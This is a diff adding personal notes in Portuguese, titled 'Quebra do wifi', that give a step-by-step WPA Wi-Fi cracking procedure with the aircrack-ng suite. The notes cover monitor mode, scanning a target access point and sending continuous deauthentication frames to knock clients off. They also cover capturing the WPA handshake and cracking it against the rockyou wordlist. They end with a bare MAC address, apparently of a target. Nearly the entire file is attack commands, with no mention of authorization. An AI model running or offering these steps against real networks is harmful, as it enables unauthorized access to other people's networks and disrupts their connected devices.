@@ -1,0 +1,36 @@
+Quebra do wifi =>
+
+ip addr - para verificar as placas de rede
+
+iwconfig - para visualizar a placa de rede wifi
+
+uname -a - para ver a versao do linux
+
+sudo airmon-ng check kill - para verificar quaisquer processos conflitantes e elimina-los (apenas para eliminar processos que n'ao interfiram no que estamos tentando fazer)
+
+sudo airmon-ng start wlan0 - colocar o wifi no monitor mode
+
+sudo airmon-ng - checar que a interface se encontra no monitor mode
+
+sudo airodump-ng wlan0mon - descrobre varias redes sem fio por perto
+
+Escolher o access point de interesse
+anotar o canal e o MAC Iddr
+
+sudo airodump-ng wlan0mon -d {endereco MAC do AP} - Ver as informacoes da rede 
+
+sudo airodump-ng -w hack1 -c {numero do canal} --bssid {endereco MAC} wlan0mon - Iremos atacar o wifi com canal x ssid y e interface z
+  abrir uma nova janela 
+  sudo aireplay-ng --deauth 0 -a {MAC Addr} wlan0mon - desautentica os clients que estao conectado a rede
+  O celular foi desautenticado, deve-se tentar autenticar novamente
+  Olhar na primeira aba, ao tentar autenticar o handshaking do WPA de 4 vias foi capturado pela tentativa
+Entrando na pasta downloads tera um arquivo hack-01.csv
+wireshark hack-01.cap - abrir o wireshark com o arquivo
+
+-- Decifrar o handshaking capturado
+sudo airmon-ng stop wlan0mon - desabilita o monitor mode do access point
+aircrack-ng hack-01.cap -w /usr/share/wordlists/rockyou.txt - crackear o handshaking passando a lista de palavras que esta armazenada nesse local
+
+para senhas maiores, usar o GPU ou haskCrack
+  
+68:D4:0C:00:5D:AF
